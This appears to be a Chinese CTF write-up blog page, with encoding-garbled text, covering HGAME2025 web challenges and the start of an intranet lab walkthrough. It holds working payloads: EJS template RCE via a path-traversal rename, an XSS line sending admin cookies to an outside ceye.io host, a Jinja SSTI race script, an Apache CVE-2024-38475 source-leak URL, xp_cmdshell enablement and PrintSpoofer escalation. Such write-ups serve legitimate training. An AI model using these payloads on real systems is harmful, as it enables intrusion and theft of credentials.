require(\u0026#39;fs\u0026#39;); 4const path = require(\u0026#39;path\u0026#39;); 5 6const app = express(); 7 8app.set(\u0026#39;view engine\u0026#39;, \u0026#39;ejs\u0026#39;); 9 10app.use(\u0026#39;/static\u0026#39;, express.static(path.join(__dirname, \u0026#39;public\u0026#39;))); 11app.use(express.json()); 12 13const storage = multer.diskStorage({ 14 destination: (req, file, cb) =\u0026gt; { 15 const uploadDir = \u0026#39;uploads\u0026#39;; 16 if (!fs.existsSync(uploadDir)) { 17 fs.mkdirSync(uploadDir); 18 } 19 cb(null, uploadDir); 20 }, 21 filename: (req, file, cb) =\u0026gt; { 22 cb(null, file.originalname); 23 } 24}); 25 26const upload = multer({ 27 storage: storage, 28 fileFilter: (_, file, cb) =\u0026gt; { 29 try { 30 if (!file.originalname) { 31 return cb(new Error(\u0026#39;æ— æ•ˆçš„æ–‡ä»¶å\u0026#39;), false); 32 } 33 cb(null, true); 34 } catch (err) { 35 cb(new Error(\u0026#39;æ–‡ä»¶å¤„ç†é”™è¯¯\u0026#39;), false); 36 } 37 } 38}); 39 40app.get(\u0026#39;/\u0026#39;, (req, res) =\u0026gt; { 41 const uploadsDir = path.join(__dirname, \u0026#39;uploads\u0026#39;); 42 43 if (!fs.existsSync(uploadsDir)) { 44 fs.mkdirSync(uploadsDir); 45 } 46 47 fs.readdir(uploadsDir, (err, files) =\u0026gt; { 48 if (err) { 49 return res.status(500).render(\u0026#39;mortis\u0026#39;, { files: [] }); 50 } 51 res.render(\u0026#39;mortis\u0026#39;, { files: files }); 52 }); 53}); 54 55app.post(\u0026#39;/upload\u0026#39;, (req, res) =\u0026gt; { 56 upload.single(\u0026#39;file\u0026#39;)(req, res, (err) =\u0026gt; { 57 if (err) { 58 return res.status(400).json({ error: err.message }); 59 } 60 if (!req.file) { 61 return res.status(400).json({ error: \u0026#39;æ²¡æœ‰é€‰æ‹©æ–‡ä»¶\u0026#39; }); 62 } 63 res.json({ 64 message: \u0026#39;æ–‡ä»¶ä¸Šä¼ æˆåŠŸ\u0026#39;, 65 filename: req.file.filename 66 }); 67 }); 68}); 69 70app.post(\u0026#39;/rename\u0026#39;, (req, res) =\u0026gt; { 71 const { oldName, newName } = req.body; 72 const oldPath = path.join(__dirname, \u0026#39;uploads\u0026#39;, oldName); 73 const newPath = path.join(__dirname, \u0026#39;uploads\u0026#39;, newName); 74 75 if (!oldName || !newName) { 76 return res.status(400).json({ error: \u0026#39; \u0026#39; }); 77 } 78 79 fs.rename(oldPath, newPath, (err) =\u0026gt; { 80 if (err) { 81 return res.status(500).json({ error: \u0026#39; \u0026#39; + err.message }); 82 } 83 res.json({ message: \u0026#39; \u0026#39; }); 84 }); 85}); 86 87app.listen(port, () =\u0026gt; { 88 console.log(`æœåŠ¡å™¨è¿è¡Œåœ¨ http://localhost:${port}`); 89}); è¿™é¢˜æœ‰ç‚¹åƒ24å›½èµ›çš„ezjs\næ–‡ç«  - å¯¹ejså¼•æ“æ¼æ´åŠå‡½æ•°ç‰¹æ€§çš„åˆ©ç”¨ - å…ˆçŸ¥ç¤¾åŒº\nå¯ä»¥çœ‹åˆ°åœ¨ /rename è·¯ç”±\n1app.post(\u0026#39;/rename\u0026#39;, (req, res) =\u0026gt; { 2 const { oldName, newName } = req.body; 3 const oldPath = path.join(__dirname, \u0026#39;uploads\u0026#39;, oldName); 4 const newPath = path.join(__dirname, \u0026#39;uploads\u0026#39;, newName); 5 6 if (!oldName || !newName) { 7 return res.status(400).json({ error: \u0026#39; \u0026#39; }); 8 } 9 10 fs.rename(oldPath, newPath, (err) =\u0026gt; { 11 if (err) { 12 return res.status(500).json({ error: \u0026#39; \u0026#39; + err.message }); 13 } 14 res.json({ message: \u0026#39; \u0026#39; }); 15 }); 16}); è¿™ä¸ªè·¯ç”±ä¼šå°†uploadsç›®å½•ä¸­çš„æ–‡ä»¶é‡å‘½å\næˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªè·¯ç”±ï¼Œé€šè¿‡ç›®å½•ç©¿è¶Šå¯¹ä»»æ„æ–‡ä»¶è¿›è¡Œç§»åŠ¨å’Œé‡å‘½å\nä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸Šä¼ æ¶æ„çš„ejsåˆ°uploadsç›®å½•ï¼Œæ¥ç€é€šè¿‡/renameè·¯ç”±å°†æˆ‘ä»¬ä¸Šä¼ çš„æ¶æ„ejsæ–‡ä»¶è¦†å†™æ‰/è·¯ç”±çš„æ¨¡æ¿æ–‡ä»¶mortis.ejså®ç°RCE\neval.ejs\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div\u0026gt; \u0026lt;%= process.mainModule.require(\u0026#39;child_process\u0026#39;).execSync(\u0026#39;whoami\u0026#39;) %\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; å°†ejsä¸Šä¼ \nè¦†å†™åŸæ¥çš„ejs\nè®¿é—®/\nè¿™é¢˜flagè—åœ¨ç¯å¢ƒå˜é‡é‡Œ\npayload:\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div\u0026gt; \u0026lt;%= process.mainModule.require(\u0026#39;child_process\u0026#39;).execSync(\u0026#39;printenv\u0026#39;) %\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Level 69 MysteryMessageBoard å¯†ç çˆ†ç ´ï¼ŒXSS cookieçªƒå–\nçˆ†å‡ºæ¥ shallot/888888\nç™»è¿›å»çœ‹åˆ°ä¸€ä¸ªç•™è¨€æ¿\nçŒœæµ‹æ˜¯xssï¼Œæµ‹è¯•ä¸€ä¸‹\n\u0026lt;script\u0026gt;alert(\u0026#39;XSS\u0026#39;)\u0026lt;/script\u0026gt; åŒæ—¶é€šè¿‡dirsearchæ‰«åˆ°äº†/adminè·¯ç”±\næ ¹æ®è¿™å¥è¯å¤§æ¦‚å¯ä»¥çŒœåˆ°ï¼Œè®¿é—®/adminè·¯ç”±çš„æ—¶å€™åº”è¯¥ä¼šåœ¨åç«¯ä»¥adminçš„èº«ä»½æ¥è®¿é—®ç•™è¨€æ¿\nä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥è¿›è¡Œcookieçªƒå–\npayload:\n\u0026lt;script\u0026gt;document.location=\u0026#39;http://dfny33.ceye.io?\u0026#39;+document.cookie;\u0026lt;/script\u0026gt; å°†payloadè¾“å‡ºåœ¨ç•™è¨€æ¿ï¼Œç„¶åè®¿é—®/admin\næˆåŠŸæ‹¿åˆ°adminçš„cookie\næ‹¿adminçš„cookieè®¿é—®/flagå³å¯æ‹¿åˆ°flag\nLevel 25 åŒé¢äººæ´¾å¯¹ è¿™é“é¢˜æœ‰ä¸¤ä¸ªç¯å¢ƒï¼Œä¸€å¼€å§‹ä»¥ä¸ºæ˜¯reï¼Œå…¶å®æ„Ÿè§‰æ›´åƒæ˜¯misc\nè®¿é—®app.service-webå¯ä»¥æ‹¿åˆ°ä¸€ä¸ªmainæ–‡ä»¶\næ˜¯ä¸€ä¸ªelfæ–‡ä»¶\nç”¨exeinfo PEæŸ¥åˆ°ç”¨upxåŠ å£³äº†\nç”¨upxå®˜æ–¹å·¥å…·å°±å¯ä»¥è„±å£³\nhttps://github.com/upx/upx/releases/latest\nè„±å£³ä¹‹åç”¨idaæ‰“å¼€\nå¯ä»¥æ‰¾åˆ°ä¸€æ®µå…³äºminioçš„å¯†é’¥ä¿¡æ¯\n.noptrdata:0000000000D614E0\t000000AA\tC\tminio:\\r\\n endpoint: \\\u0026#34;127.0.0.1:9000\\\u0026#34;\\r\\n access_key: \\\u0026#34;minio_admin\\\u0026#34;\\r\\n secret_key: \\\u0026#34;JPSQ4NOBvh2/W7hzdLyRYLDm0wNRMG48BL09yOKGpHs=\\\u0026#34;\\r\\n bucket: \\\u0026#34;prodbucket\\\u0026#34;\\r\\n key: \\\u0026#34;update\\\u0026#34; é‚£æˆ‘ä»¬å¤§æ¦‚å°±èƒ½çŒœåˆ°å¦ä¸€ä¸ªç¯å¢ƒåº”è¯¥å°±æ˜¯è¿™ä¸ªminioçš„æœåŠ¡\nç”¨mcé€šè¿‡Access Keyå’ŒSecret Keyè¿æ¥ä¸Šå»\né‡Œé¢æœ‰ä¸¤ä¸ªå‚¨å­˜æ¡¶\nå°†ä¸¤ä¸ªå‚¨å­˜æ¡¶éƒ½ä¸‹è½½ä¸‹æ¥\n/hintsé‡Œé¢æ”¾çš„æ˜¯8080æœåŠ¡çš„æºç ï¼Œ/prodbucketé‡Œé¢æ˜¯æºç ç¼–è¯‘åçš„æ–‡ä»¶å«åšupdateï¼ŒçŒœæµ‹æ˜¯çƒ­æ›´æ–°\nçœ‹ä¸€ä¸‹æºç \n1package main 2 3import ( 4\t\u0026#34;level25/fetch\u0026#34; 5\t\u0026#34;level25/conf\u0026#34; 6\t\u0026#34;github.com/gin-gonic/gin\u0026#34; 7\t\u0026#34;github.com/jpillora/overseer\u0026#34; 8) 9 10func main() { 11\tfetcher := \u0026amp;fetch.MinioFetcher{ 12\tBucket: conf.MinioBucket, 13\tKey: conf.MinioKey, 14\tEndpoint: conf.MinioEndpoint, 15\tAccessKey: conf.MinioAccessKey, 16\tSecretKey: conf.MinioSecretKey, 17\t} 18\toverseer.Run(overseer.Config{ 19\tProgram: program, 20\tFetcher: fetcher, 21\t}) 22 23} 24 25func program(state overseer.State) { 26\tg := gin.Default() 27\tg.StaticFS(\u0026#34;/\u0026#34;, gin.Dir(\u0026#34;.\u0026#34;, true)) 28\tg.Run(\u0026#34;:8080\u0026#34;) 29} æˆ‘ä»¬å¯ä»¥çŒœæµ‹/è·¯ç”±å±•ç¤ºçš„è¿™ä¸ª.ç›®å½•å°±æ˜¯å‰é¢æˆ‘ä»¬ä¸‹å‘¨mainæ–‡ä»¶çš„ç›®å½•\næˆ‘ä»¬å¯ä»¥æŠŠ.æ”¹æˆæ ¹ç›®å½•/ï¼Œç„¶åå°†ç¼–è¯‘åçš„æºç è¦†å†™æ‰åŸæ¥çš„updateï¼Œçƒ­æ›´æ–°åï¼Œæˆ‘ä»¬å°±èƒ½ç›´æ¥è®¿é—®æ ¹ç›®å½•äº†\npayload:\npackage main import ( \u0026#34;level25/fetch\u0026#34; \u0026#34;level25/conf\u0026#34; \u0026#34;github.com/gin-gonic/gin\u0026#34; \u0026#34;github.com/jpillora/overseer\u0026#34; ) func main() { fetcher := \u0026amp;fetch.MinioFetcher{ Bucket: conf.MinioBucket, Key: conf.MinioKey, Endpoint: conf.MinioEndpoint, AccessKey: conf.MinioAccessKey, SecretKey: conf.MinioSecretKey, } overseer.Run(overseer.Config{ Program: program, Fetcher: fetcher, }) } func program(state overseer.State) { g := gin.Default() g.StaticFS(\u0026#34;/abc\u0026#34;, gin.Dir(\u0026#34;/\u0026#34;, true)) g.Run(\u0026#34;:8080\u0026#34;) } è¿™é‡Œæˆ‘å°†/è·¯ç”±æ”¹æˆäº†/abcï¼Œå› ä¸ºä¸çŸ¥é“ä¸ºå•¥æˆ‘ç”¨/è·¯ç”±ä¸è¡Œ\nå°†æºç ç¼–è¯‘åè¦†å†™åˆ°å‚¨å­˜æ¡¶ä¸Š\nè®¿é—®/abc\næ‹¿åˆ°flag\nLevel 38475 è§’è½ ssti/æ¡ä»¶ç«äº‰\n/robots.txtæœ‰ä¸ª/app.conf\nè®¿é—®/app.conf\nè¿™é‡Œå±•ç¤ºäº†httpd.confçš„ç‰‡æ®µ\nè¿™é‡Œç»™å‡ºäº†æºç çš„ä½ç½®è¿˜æœ‰ä¸€ä¸ªé‡å†™å¼•æ“çš„è§„åˆ™ï¼ŒçŒœæµ‹åº”è¯¥æ˜¯è¯¥ç‰ˆæœ¬çš„apacheå­˜åœ¨æºç æ³„éœ²\nåŒæ—¶åœ¨å“åº”æ ‡å¤´èƒ½æ‰¾åˆ°Apacheçš„ç‰ˆæœ¬ä¿¡æ¯\nå¯ä»¥æ‰¾åˆ°è¿™ä¸ªç‰ˆæœ¬çš„apacheå­˜åœ¨æºç æ³„éœ²ï¼Œè€Œä¸”æ˜¯è·Ÿé‡å†™è§„åˆ™æœ‰å…³\nCVE-2024-38475\nç½‘ä¸Šæ²¡æ‰¾åˆ°ä»€ä¹ˆpoc\nä½†æ˜¯å¯ä»¥æ‰¾åˆ°æ¼æ´å‘ç°è€…çš„ä¸€ç¯‡æ–‡ç« \nhttps://blog.orange.tw/posts/2024-08-confusion-attacks-en/\næ ¹æ®è¿™ç¯‡æ–‡ç« æˆ‘ä»¬å¯ä»¥æ„é€ å‡ºpaylaod\nhttp://node1.hgame.vidar.club:31155/admin/usr/local/apache2/app/app.py%3F è¿™é“é¢˜å¤šäº†ä¸€ä¸ªRewriteCond \u0026ldquo;%{HTTP_USER_AGENT}\u0026rdquo; \u0026ldquo;^L1nk/\u0026rdquo;ï¼Œåªéœ€è¦åœ¨user-agentå‰é¢åŠ ä¸ŠL1nk/å³å¯\næ‹¿åˆ°æºç \n1from flask import Flask, request, render_template, render_template_string, redirect 2import os 3import templates 4 5app = Flask(__name__) 6pwd = os.path.dirname(__file__) 7show_msg = templates.show_msg 8 9 10def readmsg(): 11\tfilename = pwd + \u0026#34;/tmp/message.txt\u0026#34; 12\tif os.path.exists(filename): 13\tf = open(filename, \u0026#39;r\u0026#39;) 14\tmessage = f.read() 15\tf.close() 16\treturn message 17\telse: 18\treturn \u0026#39;No message now.\u0026#39; 19 20 21@app.route(\u0026#39;/index\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) 22def index(): 23\tstatus = request.args.get(\u0026#39;status\u0026#39;) 24\tif status is None: 25\tstatus = \u0026#39;\u0026#39; 26\treturn render_template(\u0026#34;index.html\u0026#34;, status=status) 27 28 29@app.route(\u0026#39;/send\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) 30def write_message(): 31\tfilename = pwd + \u0026#34;/tmp/message.txt\u0026#34; 32\tmessage = request.form[\u0026#39;message\u0026#39;] 33 34\tf = open(filename, \u0026#39;w\u0026#39;) 35\tf.write(message) 36\tf.close() 37 38\treturn redirect(\u0026#39;index?status=Send successfully!!\u0026#39;) 39\t40@app.route(\u0026#39;/read\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) 41def read_message(): 42\tif \u0026#34;{\u0026#34; not in readmsg(): 43\tshow = show_msg.replace(\u0026#34;{{message}}\u0026#34;, readmsg()) 44\treturn render_template_string(show) 45\treturn \u0026#39;waf!!\u0026#39; 46\t47 48if __name__ == \u0026#39;__main__\u0026#39;: 49\tapp.run(host = \u0026#39;0.0.0.0\u0026#39;, port = 5000) å¯ä»¥çœ‹åˆ°/readè·¯ç”±å­˜åœ¨sstiï¼Œä½†æ˜¯ä»–wafæ‰äº†æœ€é‡è¦çš„{\nä½†æ˜¯å¯ä»¥çœ‹åˆ°è¿™ä¸ª/sendè·¯ç”±ä¼šå°†ä¼ å…¥çš„ä¿¡æ¯å†™å…¥message.txtæ–‡ä»¶ï¼Œåœ¨è®¿é—®/readè·¯ç”±çš„æ—¶å€™åˆ™ä¼šè¯»å–message.txtæ–‡ä»¶ã€‚è¿™ä¹ˆä¸€æ¥æˆ‘ä»¬å°±å¯ä»¥è€ƒè™‘é€šè¿‡ç«äº‰çš„æ–¹å¼æ¥ç»•è¿‡wafäº†ã€‚ç«äº‰æ€è·¯å¤§æ¦‚å°±æ˜¯æˆ‘åœ¨å¾ˆçŸ­çš„æ—¶é—´å†…è¿ç»­å‘é€ä¸¤æ¡ä¿¡æ¯ï¼Œç¬¬ä¸€æ¡ä¿¡æ¯æ˜¯åˆæ³•ä¿¡æ¯ï¼Œè€Œç¬¬äºŒæ¡ä¿¡æ¯æ˜¯ä¸åˆæ³•çš„ï¼Œé‚£ä¹ˆå°±ä¼šå­˜åœ¨ä¸€ç§æƒ…å†µï¼Œå½“ç¬¬ä¸€æ¡ä¿¡æ¯é€šè¿‡äº†åˆ¤æ–­ï¼Œæ¥ä¸‹æ¥è¦å°†æ–‡ä»¶çš„å†…å®¹æ’å…¥åˆ°æ¨¡æ¿ä¸­æ¸²æŸ“çš„æ—¶å€™ï¼Œåˆšå¥½ç¬¬äºŒæ¡ä¸åˆæ³•çš„ä¿¡æ¯è¦†å†™äº†message.txtï¼Œé‚£ä¹ˆæ’å…¥æ¨¡æ¿ä¸­çš„å°±æ˜¯ç¬¬äºŒæ¡ä¸åˆæ³•çš„ä¿¡æ¯äº†\næ¥ä¸‹æ¥å°±æ˜¯æ“è„šæœ¬å‘åŒ…\nä¸‰ä¸ªè„šæœ¬\npoc1\n1import requests 2while True: 3 burp0_url = \u0026#34;http://node1.hgame.vidar.club:30762/app/send\u0026#34; 4 burp0_headers = {\u0026#34;Cache-Control\u0026#34;: \u0026#34;max-age=0\u0026#34;, \u0026#34;Accept-Language\u0026#34;: \u0026#34;zh-CN,zh;q=0.9\u0026#34;, \u0026#34;Origin\u0026#34;: \u0026#34;http://node1.hgame.vidar.club:30762\u0026#34;, \u0026#34;Content-Type\u0026#34;: \u0026#34;application/x-www-form-urlencoded\u0026#34;, \u0026#34;Upgrade-Insecure-Requests\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;User-Agent\u0026#34;: \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36\u0026#34;, \u0026#34;Accept\u0026#34;: \u0026#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\u0026#34;, \u0026#34;Referer\u0026#34;: \u0026#34;http://node1.hgame.vidar.club:30762/app/index\u0026#34;, \u0026#34;Accept-Encoding\u0026#34;: \u0026#34;gzip, deflate, br\u0026#34;, \u0026#34;Connection\u0026#34;: \u0026#34;keep-alive\u0026#34;} 5 burp0_data = {\u0026#34;message\u0026#34;: \u0026#34;{{config.__class__.__init__.__globals__[\u0026#39;os\u0026#39;].popen(\u0026#39;cat /flag\u0026#39;).read()}}\u0026#34;} 6 res = requests.post(burp0_url, headers=burp0_headers, data=burp0_data) 7 print(res.status_code) 8 poc2\n1import requests 2while True: 3 burp0_url = \u0026#34;http://node1.hgame.vidar.club:30762/app/send\u0026#34; 4 burp0_headers = {\u0026#34;Cache-Control\u0026#34;: \u0026#34;max-age=0\u0026#34;, \u0026#34;Accept-Language\u0026#34;: \u0026#34;zh-CN,zh;q=0.9\u0026#34;, \u0026#34;Origin\u0026#34;: \u0026#34;http://node1.hgame.vidar.club:30762\u0026#34;, \u0026#34;Content-Type\u0026#34;: \u0026#34;application/x-www-form-urlencoded\u0026#34;, \u0026#34;Upgrade-Insecure-Requests\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;User-Agent\u0026#34;: \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36\u0026#34;, \u0026#34;Accept\u0026#34;: \u0026#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\u0026#34;, \u0026#34;Referer\u0026#34;: \u0026#34;http://node1.hgame.vidar.club:30762/app/index\u0026#34;, \u0026#34;Accept-Encoding\u0026#34;: \u0026#34;gzip, deflate, br\u0026#34;, \u0026#34;Connection\u0026#34;: \u0026#34;keep-alive\u0026#34;} 5 burp0_data = {\u0026#34;message\u0026#34;: \u0026#34;123\u0026#34;} 6 res = requests.post(burp0_url, headers=burp0_headers, data=burp0_data) 7 print(res.status_code) poc3\n1import requests 2while True: 3 burp0_url = \u0026#34;http://node1.hgame.vidar.club:30762/app/read\u0026#34; 4 burp0_headers = {\u0026#34;Accept-Language\u0026#34;: \u0026#34;zh-CN,zh;q=0.9\u0026#34;, \u0026#34;Upgrade-Insecure-Requests\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;User-Agent\u0026#34;: \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36\u0026#34;, \u0026#34;Accept\u0026#34;: \u0026#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\u0026#34;, \u0026#34;Accept-Encoding\u0026#34;: \u0026#34;gzip, deflate, br\u0026#34;, \u0026#34;Connection\u0026#34;: \u0026#34;keep-alive\u0026#34;} 5 res = requests.get(burp0_url, headers=burp0_headers) 6 # print(res.text) 7 if \u0026#34;hgame\u0026#34; in (res.text): 8 print(res.text) 9 break æˆåŠŸæ‰§è¡Œï¼Œæ‹¿åˆ°flag\n","permalink":"http://localhost:1313/post/hgame2025-week1/","summary":"\u003ch2 id=\"web\"\u003eWeb\u003c/h2\u003e\n\u003ch3 id=\"week1\"\u003eweek1\u003c/h3\u003e\n\u003ch3 id=\"level-24-pacman\"\u003eLevel 24 Pacman\u003c/h3\u003e\n\u003cp\u003eæ‹¿åˆ°ç¯å¢ƒ\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250206151704506\" loading=\"lazy\" src=\"../assets/image-20250206151704506.png\"\u003e\u003c/p\u003e\n\u003cp\u003eä¸€ä¸ªå°æ¸¸æˆï¼ŒçŒœæµ‹åº”è¯¥æ˜¯jså®¡è®¡\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250206151846623\" loading=\"lazy\" src=\"../assets/image-20250206151846623.png\"\u003e\u003c/p\u003e\n\u003cp\u003eæŸ¥çœ‹index.jså‘ç°ä»£ç è¿›è¡Œäº†æ··æ·†\u003c/p\u003e\n\u003cp\u003eå¯ä»¥ç”¨å·¥å…·åæ··æ·†ä¸€ä¸‹ï¼Œå¢åŠ ä¸€ä¸‹å¯è¯»æ€§\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://tool.yuanrenxue.cn/decode_obfuscator\"\u003ehttps://tool.yuanrenxue.cn/decode_obfuscator\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250206152531656\" loading=\"lazy\" src=\"../assets/image-20250206152531656.png\"\u003e\u003c/p\u003e\n\u003cp\u003eåæ··æ·†ä¹‹åæ‰¾åˆ°è¿™ä¸ª\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250206152608227\" loading=\"lazy\" src=\"../assets/image-20250206152608227.png\"\u003e\u003c/p\u003e","title":"HGAME2025 WEEK1"},{"content":"","permalink":"http://localhost:1313/about/","summary":"about","title":"å…³äº"},{"content":"Tsclientæ˜¯ä¸€å¥—éš¾åº¦ä¸ºä¸­ç­‰çš„é¶åœºç¯å¢ƒï¼Œå®Œæˆè¯¥æŒ‘æˆ˜å¯ä»¥å¸®åŠ©ç©å®¶äº†è§£å†…ç½‘æ¸—é€ä¸­çš„ä»£ç†è½¬å‘ã€å†…ç½‘æ‰«æã€ä¿¡æ¯æ”¶é›†ã€ç‰¹æƒæå‡ä»¥åŠæ¨ªå‘ç§»åŠ¨æŠ€æœ¯æ–¹æ³•ï¼ŒåŠ å¼ºå¯¹åŸŸç¯å¢ƒæ ¸å¿ƒè®¤è¯æœºåˆ¶çš„ç†è§£ï¼Œä»¥åŠæŒæ¡åŸŸç¯å¢ƒæ¸—é€ä¸­ä¸€äº›æœ‰è¶£çš„æŠ€æœ¯è¦ç‚¹ã€‚è¯¥é¶åœºå…±æœ‰3ä¸ªflagï¼Œåˆ†å¸ƒäºä¸åŒçš„é¶æœºã€‚\nå‚è€ƒæ–‡ç« \næ˜¥ç§‹äº‘é•œ TSclient \u0026ndash; Walkthrough - KingBridge - åšå®¢å›­\næ˜¥ç§‹äº‘å¢ƒ Tsclient | åˆé›¶Â·b10g~ğŸ¥\nFLAG1 å…ˆç”¨fscanæ‰«ä¸€ä¸‹\nmssqlæœåŠ¡æ˜¯å¼±å£ä»¤\nsa/1qaz!QAZ ç”¨æ•°æ®åº“ç®¡ç†å·¥å…·è¿ä¸Šå»\næ¥ä¸‹æ¥è¦çœ‹mssqlæ€ä¹ˆè¿›è¡Œå‘½ä»¤æ‰§è¡Œ\nå‚è€ƒæ–‡ç« ï¼š\nhttps://xz.aliyun.com/news/7129\nåˆ¤æ–­xp_cmdshellçŠ¶æ€\nselect * from master.dbo.sysobjects where xtype=\u0026#39;x\u0026#39; and name=\u0026#39;xp_cmdshell\u0026#39; å­˜åœ¨\né‚£æˆ‘ä»¬æ¥ä¸‹æ¥å¯åŠ¨å®ƒ\nEXEC sp_configure \u0026#39;show advanced options\u0026#39;, 1;RECONFIGURE;EXEC sp_configure \u0026#39;xp_cmdshell\u0026#39;, 1;RECONFIGURE; é…ç½®é€‰é¡¹ \u0026#39;xp_cmdshell\u0026#39; å·²ä» 0 æ›´æ”¹ä¸º 1ã€‚è¯·è¿è¡Œ RECONFIGURE è¯­å¥è¿›è¡Œå®‰è£…ã€‚ å¯åŠ¨æˆåŠŸ\næ¥ä¸‹æ¥å°±å¯ä»¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œäº†\nexec master..xp_cmdshell \u0026#39;whoami\u0026#39; æ¥ä¸‹æ¥ç›´æ¥vshellä¸€å¥è¯ä¸Šçº¿\næ²¡æ‰¾åˆ°flagï¼Œå‘ç°Administratoræ–‡ä»¶å¤¹æ²¡æœ‰æƒé™\næƒ³åˆ°è¦ææƒï¼Œä¼ ä¸€ä¸ªPrintSpooferè¿›è¡Œææƒ\nhttps://github.com/whojeff/PrintSpoofer\n1PrintSpoofer.exe -i -c cmd ææƒä¹‹åæ‹¿åˆ°flag\n1C:\\Tmp\u0026gt;type C:\\Users\\Administrator\\flag\\flag01.txt 2 _________ ________ ________ ___ ___ _______ ________ _________ 3|\\___ ___\\\\ ____\\|\\ ____\\|\\ \\ |\\ \\|\\ ___ \\ |\\ ___ \\|\\___ ___\\ 4\\|___ \\ \\_\\ \\ \\___|\\ \\ \\___|\\ \\ \\ \\ \\ \\ \\ __/|\\ \\ \\\\ \\ \\|___ \\ \\_| 5 \\ \\ \\ \\ \\_____ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\_|/_\\ \\ \\\\ \\ \\ \\ \\ \\ 6 \\ \\ \\ \\|____|\\ \\ \\ \\____\\ \\ \\____\\ \\ \\ \\ \\_|\\ \\ \\ \\\\ \\ \\ \\ \\ \\ 7 \\ \\__\\ ____\\_\\ \\ \\_______\\ \\_______\\ \\__\\ \\_______\\ \\__\\\\ \\__\\ \\ \\__\\ 8 \\|__| |\\_________\\|_______|\\|_______|\\|__|\\|_______|\\|__| \\|__| \\|__| 9 \\|_________| 10 11 12Getting flag01 is easy, right? 13 14flag01: flag{5ee60dcf-4f7b-4e2a-977e-cbf1697d8df4} 15 16 17Maybe you should focus on user sessions... ææƒä¹‹åç”¨ææƒåçš„è´¦æˆ·é‡æ–°ä¸Šä¸€ä¸‹çº¿\næ¥ä¸‹æ¥ç”¨fscanæ‰«ä¸€ä¸‹å†…ç½‘\n1â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” 2â”‚ ___ _ â”‚ 3â”‚ / _ \\ ___ ___ _ __ __ _ ___| | __ â”‚ 4â”‚ / /_\\/____/ __|/ __| \u0026#39;__/ _` |/ __| |/ / â”‚ 5â”‚ / /_\\\\_____\\__ \\ (__| | | (_| | (__| \u0026lt; â”‚ 6â”‚ \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ â”‚ 7â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ 8 Fscan Version: 2.0.0 9 10[2025-03-09 19:53:19] [INFO] æš´åŠ›ç ´è§£çº¿ç¨‹æ•°: 1 11[2025-03-09 19:53:19] [INFO] å¼€å§‹ä¿¡æ¯æ‰«æ 12[2025-03-09 19:53:19] [INFO] CIDRèŒƒå›´: 172.22.8.0-172.22.8.255 13[2025-03-09 19:53:20] [INFO] ç”ŸæˆIPèŒƒå›´: 172.22.8.0.%!d(string=172.22.8.255) - %!s(MISSING).%!d(MISSING) 14[2025-03-09 19:53:20] [INFO] è§£æCIDR 172.22.8.0/24 -\u0026gt; IPèŒƒå›´ 172.22.8.0-172.22.8.255 15[2025-03-09 19:53:20] [INFO] æœ€ç»ˆæœ‰æ•ˆä¸»æœºæ•°é‡: 256 16[2025-03-09 19:53:20] [INFO] å¼€å§‹ä¸»æœºæ‰«æ 17[2025-03-09 19:53:20] [INFO] æ­£åœ¨å°è¯•æ— ç›‘å¬ICMPæ¢æµ‹... 18[2025-03-09 19:53:20] [INFO] å½“å‰ç”¨æˆ·æƒé™ä¸è¶³,æ— æ³•å‘é€ICMPåŒ… 19[2025-03-09 19:53:20] [INFO] åˆ‡æ¢ä¸ºPINGæ–¹å¼æ¢æµ‹... 20[2025-03-09 19:53:20] [SUCCESS] ç›®æ ‡ 172.22.8.31 å­˜æ´» (ICMP) 21[2025-03-09 